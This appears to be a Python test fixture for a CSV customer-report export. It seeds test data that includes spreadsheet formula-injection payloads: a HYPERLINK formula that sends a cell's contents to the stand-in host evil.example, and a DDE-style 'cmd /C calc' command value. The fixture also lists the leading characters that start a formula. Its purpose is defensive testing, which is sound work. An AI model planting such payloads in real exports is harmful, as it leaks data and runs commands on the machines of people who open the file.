import csv
import io

from app.reports import Store

FORMULA_START = ("=", "+", "-", "@", "\t", "\r")


def store():
    s = Store()
    s.roles[("a1", "ada")] = "admin"
    s.roles[("a1", "vic")] = "viewer"
    s.roles[("a2", "zoe")] = "admin"
    s.add_customer("a1", "Grace Hopper", "grace@example.test", "web", 120)
    s.add_customer("a1", "Lovelace, Ada", "ada@example.test", "referral", 75.5)
    s.add_customer("a1", '=HYPERLINK("http://evil.example/?d="&A3,"Click")', "x@example.test", "web", 0)
    s.add_customer("a1", "Bobby", "bobby@example.test", "@SUM(1+9)*cmd|' /C calc'!A0", 0)
    s.add_customer("a1", "+1 555 0100", "plus@example.test", "-2+3", 0)
    s.add_customer("a2", "Secret Rival Customer", "rival@example.test", "web", 99999)
    return s


def parse(text):
    return list(csv.reader(io.StringIO(text)))
